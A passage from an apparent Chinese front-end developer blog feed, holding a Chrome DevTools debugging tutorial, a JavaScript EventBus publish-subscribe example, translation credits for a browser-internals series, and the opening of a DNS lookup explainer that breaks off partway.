src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617711586-2fa803a0-4b32-4415-89b4-2343084793e4.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617711586-2fa803a0-4b32-4415-89b4-2343084793e4.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>刚踏上开发之路时，我几乎只关注怎样去写代码、怎样提升自己的生产效率。诚然，这些事情很重要，但与此同时我们也应当思考浏览器会怎么去处理我们书写的代码。现代浏览器一直致力探索如何提供更好的用户体验。书写对浏览器友好的代码，反过来也能提供友好的用户体验。路漫漫其修远兮，希望我们能携手共进，构建出对浏览器更为友好的代码。</p><p><a name="8JBIM"></a></p><h1 id="文章出处"><a href="#文章出处" class="headerlink" title="文章出处"></a>文章出处</h1><blockquote><ul><li>原文地址1：<a href="https://developers.google.com/web/updates/2018/09/inside-browser-part1">Inside look at modern web browser (part 1)</a></li><li>原文地址2：<a href="https://developers.google.com/web/updates/2018/09/inside-browser-part2">Inside look at modern web browser (part 2)</a></li><li>原文地址3：<a href="https://developers.google.com/web/updates/2018/09/inside-browser-part3">Inside look at modern web browser (part 3)</a></li><li>原文地址4：<a href="https://developers.google.com/web/updates/2018/09/inside-browser-part4">Inside look at modern web browser (part 4)</a></li><li>原文作者：<a href="https://developers.google.com/web/resources/contributors/kosamari">Mariko Kosaka</a></li><li>译文出自：<a href="https://github.com/xitu/gold-miner">掘金翻译计划</a></li><li>本文永久链接1：<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-look-at-modern-web-browser-part1.md">https://github.com/xitu/gold-miner/blob/master/TODO1/inside-look-at-modern-web-browser-part1.md</a> （译者：<a href="https://github.com/Colafornia">Colafornia</a>，校对者：<a href="https://github.com/CoderMing">CoderMing</a> <a href="https://github.com/sakila1012">sakila1012</a>，2020.07.18）</li><li>本文永久链接2：<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part2.md">https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part2.md</a> （译者：<a href="https://github.com/CoolRice">CoolRice</a>，校对者：<a href="https://github.com/ThomasWhyne">ThomasWhyne</a>, <a href="https://github.com/tian-li">tian-li</a>）</li><li>本文永久链接3：<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part3.md">https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part3.md</a> （译者：<a href="https://github.com/ssshooter">ssshooter</a>，校对者：<a href="https://github.com/ThomasWhyne">ThomasWhyne</a>, <a href="https://github.com/CoolRice">CoolRice</a>）</li><li>本文永久链接4：<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part4.md">https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part4.md</a>（译者：<a href="https://github.com/ThomasWhyne">ThomasWhyne</a>，校对者：<a href="https://github.com/llp0574">llp0574</a> <a href="https://github.com/CoolRice">CoolRice</a>，2020.07.11）</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome调试技巧</title>
      <link href="/2020/11/11/frontend/browser/debug/chrome-diao-shi-ji-qiao/"/>
      <url>/2020/11/11/frontend/browser/debug/chrome-diao-shi-ji-qiao/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="54bcvn"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在前端开发过程中，我们通过浏览器的页面来查看我们代码编写的成果。然而浏览器的功能非常强大，它不只是能展示我们编写的页面，还能够帮助我们定位开发过程中遇到的问题，提升我们的开发效率。有些时候我们甚至还可以通过浏览器的调试工具来查看一些网站酷炫效果的实现方式。下面我们以Chrome浏览器为例，来介绍一些常用的调试技巧。</p><p><a name="l229zq"></a></p><h3 id="1-Chrome开发者工具"><a href="#1-Chrome开发者工具" class="headerlink" title="1. Chrome开发者工具"></a>1. Chrome开发者工具</h3><p>首先我们打开Chrome的开发者工具（又称控制台），打开方式有以下几种：</p><ol><li>点击浏览器右上角竖排的“三个点”，选择“更多工具”，再选择“开发者工具”打开</li><li>单机鼠标右键，点击“查看”选项打开</li><li>通过按快捷键 Ctrl + shift + I 快速打开</li></ol><p>通过以上任意一种方式打开开发者工具后，我们能够看到这样的界面。</p><p>开发者工具界面</p><p>开发者工具界面的信息量比较大，不过不用担心，我们一点点来看。工具栏上前几个tab是我们最常用的调试模块。</p><ul><li>Element 用于查看和编辑DOM节点和节点相对应的CSS样式。</li><li>Console 用于打印运行时抛出的信息，我们可以通过它查看异常信息或主动抛出信息进行调试。</li><li>Sources 用于查看资源信息，我们编写和运行的代码都可以在这里找到。我们可以通过在这里设置断点来达到调试的目的。</li><li>Network 用于查看请求信息，这里可以看到所有的页面资源请求，包括网络请求、图片资源、HTML、CSS、JS等。可以根据需求筛选请求项，一般多用于网络请求的查看和分析。</li><li>Performance 用于查看页面加载的性能情况，包括页面渲染时间、JS执行时间等</li><li>Application用于查看 cookie、localStorage 等信息</li></ul><p>以上是Chrome开发者工具的主要功能模块，虽然内容略多，但是正因为有了这些信息，浏览器的调试功能才会如此强大。现在记不住这些模块也没关系，接下来我们将通过使用这些调试工具，来加深对它们的理解，并看看它们能为我们的开发带来怎样的帮助。</p><p><a name="i8b1dy"></a></p><h3 id="2-DOM调试"><a href="#2-DOM调试" class="headerlink" title="2. DOM调试"></a>2. DOM调试</h3><p><a name="3wv6ln"></a></p><h4 id="2-1-查看-DOM"><a href="#2-1-查看-DOM" class="headerlink" title="2.1 查看 DOM"></a>2.1 查看 DOM</h4><p>在浏览器中，如果我们想要了解一个页面的 DOM 结构，我们可以通过开发者工具中的 Element 模块进行查看。我们首先编写一段 HTML</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM调试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个表格<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>第一列<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>第二列<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>第三列<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>11<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>22<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>33<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>保存这段 HTML 后在浏览器打开，并开启控制台。我们将工具栏选中到 Element ，会看到这样的信息</p><p>查看 DOM 元素</p><p>你会发现这里展示的 DOM 结构就是我们写的 HTML ，浏览器不仅将我们的 HTML 渲染成页面，还将它的 DOM 显示在控制台中方便我们调试。</p><p>用鼠标在控制台里选中不同的 DOM 节点，会发现页面中有蓝色区块会随着鼠标选中 DOM 节点的变化而调整，实际上 <strong>蓝色区块就是当前 DOM 节点对应渲染的页面部分</strong> 。</p><p><a name="xqf4th"></a></p><h4 id="2-2-定位-DOM"><a href="#2-2-定位-DOM" class="headerlink" title="2.2 定位 DOM"></a>2.2 定位 DOM</h4><p>当一个页面结构比较复杂，层级较深的时候，我们通过移动鼠标在 DOM 节点中寻找需要查看的节点就会变得比较麻烦。要点开它的外层节点并一级一级找下去，这样的查找方式费时费力，因此浏览器控制台提供了一个方便定位 DOM 的功能。</p><p>依然是上面那个例子，如果我们需要去找到 table 中的第一行第二列的那个单元格，怎样操作比较迅速？这里我们通过点击控制台左上角的一个定位按钮来进行快速选中。打开控制台，点击定位按钮，点击后该按钮会变成蓝色，标志我们当前正处于定位模式（定位模式下鼠标无法触发页面交互，如按钮事件等）。</p><p>定位按钮</p><p>接下来我们在页面上点击我们想要查看的元素，点击页面上table 中第一行第二列的单元格（显示 2 的那个）。点击后我们发现控制台的 Element 直接将那个 <td> 节点高亮定位了。</p><p>高亮定位</p><p>这样我们就迅速的定位了我们想要查看的 DOM 节点，此时定位按钮从蓝色变为灰色，标志着定位完成，退出定位模式。快速定位的功能在复杂结构的页面中尤为实用，我们可以在开发过程中充分利用起来。</p><p><a name="40cwdw"></a></p><h4 id="2-3-操作-DOM"><a href="#2-3-操作-DOM" class="headerlink" title="2.3 操作 DOM"></a>2.3 操作 DOM</h4><p>完成了 DOM 的定位，接下来我们可以对 DOM 元素做一些操作。对当前选中的 DOM 元素点击右键可以看到一系列的操作选项。</p><p>DOM操作选项</p><p>点击 Edit as HTML 来对当前的 DOM 节点做改写和添加，例如这里我们对 <p> 标签做编辑，在后面添加另一个 <p> 标签。</p><p>编辑p标签</p><p>完成后点击旁边未被选中到元素即可保存编辑，并在浏览器页面上同步生效。此时可以发现页面上已经出现了我们刚刚添加的节点了。</p><p>编辑后生效</p><p>如果你想撤销上一次 DOM 变更，按 ctrl + Z 即可，重做则按 ctrl + shift + Z。</p><p>其他的一些 DOM 操作也都很直观，比如可以点击 Add attribute 给选中节点添加属性；Delete element会删除选中节点等等。操作很简单，这里就不一一演示，读者可以自己尝试一下。</p><p><a name="otkqal"></a></p><h3 id="3-CSS调试"><a href="#3-CSS调试" class="headerlink" title="3. CSS调试"></a>3. CSS调试</h3><p>除了对 DOM 的操作，我们还能够方便得对CSS进行调试。不知大家在查看 DOM 的时候有没有关注到界面上还有这么一块区域？</p><p>CSS 调试区域</p><p>这里就是 CSS 的地盘。我们可以在这里看到选中的 DOM 节点上已添加的样式，可以对里面对值进行修改，或是添加其他 CSS 样式。这里我们给 <p> 标签添加一个 color 样式。</p><p>添加文字颜色样式</p><p>先用 DOM 调试的技巧选中这段文字，再对它添加完 color:red ，这时我们发现页面上的文字变成了红色，与此同时控制台对 DOM 节点树中也对这个节点动态得添加了一个 style 属性，于是我们完成了样式添加。这就是浏览器调试 CSS 样式的便捷之处 —— 简单且直观。甚至于接下来如果我想改变一下文字的颜色，只需要在样式栏里点击一下 color 属性，就可以进行变更了，所见即所得。</p><p>改变文字颜色</p><p>我们再注意到样式栏的顶部，有一些 :hover 的图标，点开来看，发现这里可以设置 DOM 的交互状态。假设勾选一个 :focus 复选框，当前选中的 DOM 节点便被模拟了获取焦点的样式特性。</p><p>模拟 DOM 交互状态</p><p>最后我们再看一下右侧部分，上面有个矩形，它就是我们在 CSS 部分中学习过的“盒子模型”。通过将鼠标在盒子模型上移动，页面上会显示出相对应的 DOM 节点，通过它我们能够更好得了解页面上的布局结构。选中 Computed ，下方显示出一系列的样式，这些样式就是节点经过浏览器计算后渲染在页面上的最终样式，如果某一个节点受到多个地方的样式影响，我们就可以在这里看到它最终的样式属性（与页面上的渲染效果相对应）。</p><p>盒子模型与最终样式</p><p><a name="yu8prs"></a></p><h3 id="4-JS调试"><a href="#4-JS调试" class="headerlink" title="4. JS调试"></a>4. JS调试</h3><p>本节内容将简单介绍如何使用浏览器对 JS 进行调试，由于很多时候我们所说的浏览器调试都是指 JS 调试，因此这部分有很多调试的方法和技巧。具体的调试技巧将在下一章节详细介绍，本节只做一个熟悉的过程。</p><p>JS 的调试主要关注的区域是 Console 和 Sources 模块，前文说过 Console 模块是用于打印运行时抛出的信息，我们可以通过它查看异常信息或主动抛出信息进行调试。 Sources 用于查看资源信息，我们编写和运行的代码都可以在这里找到。我们可以通过在这里设置断点来达到调试的目的。那么接下来我们分别对这两个模块加以认识。</p><p>首先点击进入 Console 模块，会看到一个可输入的控制台界面。在这里我们可以输入一些简单的 JS 指令，按回车键执行。</p><p>Console 控制台</p><p>通过简单的尝试可以看到，在这里我们可以能够执行 JS 脚本，并且直观得看到输出结果。这意味着当我们希望看到 JS 代码运行时的数据状态时，我们可以利用这个工具来给我们展现。那么如何在 JS 中使用 Console 控制台呢？其实很简单，只要在你希望查看的数据处加上一行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(希望查看的数据);</span><br></pre></td></tr></table></figure><p>即可在 Console 控制台中查看数据。有了它我们不需要等到 JS 代码执行完毕才能看是否符合预期，在执行过程中我们就可以很方便得查看动态数据并打印记录在控制台中，这对我们的编程有很大的帮助。</p><p>接下来我们来看 Sources 模块。我们可以任意访问一个在线网站，然后打开控制台，点击  Sources 会看到一些代码。这些代码就是当前这个页面所引用的资源，包括 JS 文件，样式文件等等，由于线上运行的代码通常是经过混淆和压缩的,可能难以定位和阅读。我们在文件底部可以看到一个花括号 {} ,点击这个花括号我们能将压缩了的文件格式化成正常的语法缩进。</p><p>Sources 界面</p><p>我们注意到代码的左侧是一列数字，标记着当前的代码处于第几行。这列数字是可以点击的，当点击某个数后，数字被标记成蓝色，此时标记着我们在这一行代码处设置了断点，当程序运行到这段代码处时会停止运行并保留运行现场。我们可以查看当下运行时的数据和方法的执行情况，实际上这就是我们所谓的“断点调试”，下一章节会详细演示。</p><p>这里我们关注到当程序运行到断点处时，页面上会出现一个条形的操作栏显示 paused in debugger ，右边紧跟着两个按钮。第一个三角形的按钮表示 “跳过断点” ，点击它之后脚本会继续往下执行，直到完成运行或是进入到下一个设置的断点。另一个弧形的按钮表示 “单步调试” ，代码会进入到断点的下一行，我们可以查看下一行代码的运行情况。由于此时仍然是断点状态我们可以重复点击 “单步调试” 的按钮达到逐步运行的调试效果。</p><p>断点调试操作界面</p><p>最后再介绍一些 Sources 模块下实用的快捷键，选中控制台的 Sources 之后按下 ctrl + P ，能够搜索当前页面引用的资源。通过它我们可以迅速找到希望调试的 JS 文件。当我们选中某个文件之后，可以使用快捷键 ctrl + F 进行文件内容检索，方便快速定位代码片段和查看变量使用。</p><p>常用快捷键操作</p><p><a name="q2h3lz"></a></p><h3 id="5-网络请求调试"><a href="#5-网络请求调试" class="headerlink" title="5. 网络请求调试"></a>5. 网络请求调试</h3><p>接下来我们再来看看网络请求的调试。在网页开发中网络请求是的数据的来源渠道，加载一个页面所需的 HTML 、 CSS 、JS 以及图片等资源都是通过网络请求获取的。数据的获取直接影响着页面内容的展示，如此重要的环节浏览器自然也对其做了监控。我们可以通过 Network 模块来对网络请求进行分析和调试。</p><p>任意打开一个在线网址如 <a href="https://github.com/">https://github.com</a> ，进入控制台并点击 Network ，我们能够看到很多资源请求。</p><p>Network工具栏</p><p>工具栏上有很多分类：XHR、JS、CSS、Img、Media、Font、Doc、WS、Manifest等，这些是请求资源的分类。默认是展示全部 All ，点击到其中某一项则能够将请求列表过滤为只有该类型。如点击 JS 则下面的请求列表全部为 JS 资源，点击 XHR 则过滤为向后端发送的异步请求。</p><p>大部分时候我们用到最多的分类是 XHR ，它能够帮助我们调试异步请求。从我们发送请求到我们接收响应数据的过程中，大量细节都记录在控制台中。我们可以点击一个具体的异步请求进行查看</p><p>异步请求调试</p><p>首先看到 Header 这一栏，里面包含了很多信息，这些信息分成4个模块： General 、 Response Headers 、 Request Headers 和 Query String Parameters。</p><ul><li>General里面记录的是请求的基本信息，包括请求地址（Request URL）、请求类型（Request Method）、请求发送状态（Status Code）等</li><li>Response Headers是响应头，里面记录了返回数据的类型（Content-Type）,浏览器数据的压缩格式(Content-Encoding),服务器的类型(Server),当前时间(Date)等</li><li>Request Headers是请求头，里面记录了本次请求的客户机支持的数据类型（Accept），缓存控制（Cache-Control），Cookie，访问的主机名（Host），处理完这次请求后的连接方式（Connection）等</li><li>Query String Parameters是异步请求的参数，如果是 get 请求，则参数为加在url后面的一串查询参数，如果是post请求，则参数为 body 体里的 json 对象。</li></ul><p>然后我们切到 Preview 这里我们看到的内容是异步请求返回的数据，数据格式是 JSON 对象。很多时候我们就是通过查看这里的数据来进行异步请求的数据查看和问题排查。当我们调用了一个后端提供的接口，我们第一时间就该来到这里查看后端返回了怎样的数据，我们才能继续利用这些数据进行后续的操作。</p><p>查看请求返回数据</p><p>接下来我们再看 Response ，里面的内容是也是异步请求返回数据，不过它跟 preview 的区别在于 preview 中的数据是以  JSON 对象的形式返回的，而在 Response 中是以 JSON 字符串的形式返回。</p><p>JSON字符串形式的返回数据</p><p>最后的 Timing 一栏中，展示了本次异步请求的时间开销。在哪个环节消耗了多少时间在这一栏里都能很明确得展示出来，因此当一个异步请求的等待时间较长时，我们不妨可以到这里来看看是在哪个环节能够进行优化。</p><p>请求耗时分布</p><p>怎么样？一个异步请求的发送过程是不是在浏览器中记录得非常详细了？正是因为有了这样强大的功能，Chrome浏览器才会成为众多前端开发人员钟爱的调试利器。</p><p><a name="sv5glk"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本章节介绍了 Chrome 浏览器的基本调试场景和调试方法，并分别对 DOM 调试，CSS调试，JS调试和网络请求的调试做了展示。当然， Chrome 浏览器的调试功能并不仅限于此，还有很多模块值得大家去探索。浏览器是前端开发用于展示的平台，更是我们提升效率的利器，大家一定要多多尝试，将它充分利用起来。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
          <category> 调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>发布订阅subscribe</title>
      <link href="/2020/10/07/frontend/interview/fa-bu-ding-yue-subscribe/"/>
      <url>/2020/10/07/frontend/interview/fa-bu-ding-yue-subscribe/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发布订阅模式 EventBus.js</span></span><br><span class="line"><span class="keyword">let</span> instance = <span class="literal">null</span></span><br><span class="line"><span class="keyword">const</span> listeners = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EventBus</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> getInstance = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (instance) &#123;</span><br><span class="line">      <span class="keyword">return</span> instance</span><br><span class="line">    &#125;</span><br><span class="line">    instance = <span class="keyword">new</span> <span class="title class_">EventBus</span>()</span><br><span class="line">    <span class="keyword">return</span> instance</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  on = <span class="function">(<span class="params">event, fn</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (listeners[event]) &#123;</span><br><span class="line">      listeners[event].<span class="title function_">push</span>(fn)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      listeners[event] = [fn]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  emit = <span class="function">(<span class="params">event, data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      listeners[event].<span class="title function_">map</span>(<span class="function"><span class="params">fn</span> =&gt;</span> <span class="title function_">fn</span>(data))</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="keyword">throw</span> error</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  off = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">delete</span> listeners[event]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> eventBus = <span class="title class_">EventBus</span>.<span class="title function_">getInstance</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line">eventBus.<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">eventBus.<span class="title function_">emit</span>(<span class="string">&#x27;click&#x27;</span>, <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">eventBus.<span class="title function_">off</span>(<span class="string">&#x27;click&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> eventBus;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS</title>
      <link href="/2020/08/06/frontend/browser/dns/"/>
      <url>/2020/08/06/frontend/browser/dns/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>DNS (Domain Name System)， 也叫网域名称系统，是互联网的一项服务。它实质上是一个 <strong>域名</strong> 和 <strong>IP</strong> 相互映射的分布式数据库，有了它，我们就可以通过域名更方便的访问互联网。最初，由于ip长且难记，通过ip访问网站不方便。。所以后来通过发明了DNS服务器，这个时候我们访问网站输入网站域名，DNS服务器就解析我们的域名为ip。这样我们实际访问的就是对应的ip地址啦。<br />DNS有以下特点:</p><ul><li>分布式的</li><li>协议支持TCP 和 UDP, 常用端口是53</li><li>每一级域名的长度限制是63</li><li>域名总长度限制是253</li></ul><p><strong>那么，什么情况下使用TCP，什么情况下使用UDP呢?</strong><br />最早的时候，DNS 的UDP报文上限大小是512 字节， 所以当某个response大小超过512 (返回信息太多)，DNS服务就会使用TCP协议来传输。后来DNS 协议扩展了自己的UDP协议，DNS client 发出查询请求时，可以指定自己能接收超过512字节的UDP包， 这种情况下，DNS 还是会使用UDP协议</p><p>域名与ip的对应关系，被称为记录(record)，可分为各种类型</p><ul><li>A: Address，域名指向的IP地址，一个域名可以有多个A记录。</li><li>NS：Name Server，保存下一级域名信息的服务器地址</li><li>MX：Mail eXchange，接受电子邮件的服务器地址</li><li>CNAME：Canonical Name，返回另一个域名，令当前查询域名挑去该域名，多个域名-&gt;服务器的映射。</li><li>PTR： Pointer Record，只用于ip地址查询域名</li></ul><p>DNS由下面三个部分组成</p><ul><li>名称解析器（resolver）</li><li>域名空间（domain name space）</li><li>名称服务器（name server）</li></ul><p>假如你要访问baidu.com，需要先通过dns系统查出他的ip地址如220.181.57.216，才能访问。</p><p><a name="sjKGj"></a></p><h2 id="dns查询的过程"><a href="#dns查询的过程" class="headerlink" title="dns查询的过程"></a>dns查询的过程</h2><p>dns通过域名查出ip（我们以浏览器输入<a href="http://www.example.com为例）：">www.example.com为例）：</a></p><ol><li>检查浏览器缓存(缓存时间比较短，默认只有1分钟，且只能容纳1000条缓存)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 查看Chrome自身的缓存</span><br><span class="line">chrome://net-internals/<span class="comment">#dns</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589511986523-9ee9d1e7-6c5a-4c1d-818f-8c95b137f801.png#height=235&id=i8N3l&originHeight=235&originWidth=529&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19755&status=done&style=none&title=&width=529" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589511986523-9ee9d1e7-6c5a-4c1d-818f-8c95b137f801.png#height=235&id=i8N3l&originHeight=235&originWidth=529&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19755&status=done&style=none&title=&width=529" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><ol start="2"><li>检查操作系统DNS缓存</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows - 查看DNS缓存条目</span></span><br><span class="line">$ pconfig /displaydns</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac - 查看DNS缓存条目 打开控制台应用</span></span><br><span class="line">sudo <span class="built_in">log</span> config --mode <span class="string">&quot;private_data:on&quot;</span></span><br><span class="line">sudo killall -INFO mDNSResponder</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>读取<code>hosts</code>文件</li><li>检查路由器缓存</li><li>如果前几步都没没找到，会向ISP(网络服务提供商)的LDNS服务器查询</li><li>如果LDNS服务器没找到，会向跟域名服务器(Root Server)请求解析，分为以下几步：<ol><li>跟服务器返回顶级域名(TLD)服务器如.com，.cn，.org等的地址，全球只有13台，该例子中会返回.com的地址</li><li>接着向TLD发送请求，然后会返回次级域名(SLD)服务器的地址，本例子会返回.example的地址</li><li>接着向SLD域名服务器通过域名查询目标IP，本例子会返回<a href="http://www.example.com的地址/">www.example.com的地址</a></li><li>Local DNS Server会缓存结果，并返回给用户，缓存在系统中。</li></ol></li></ol><p><img 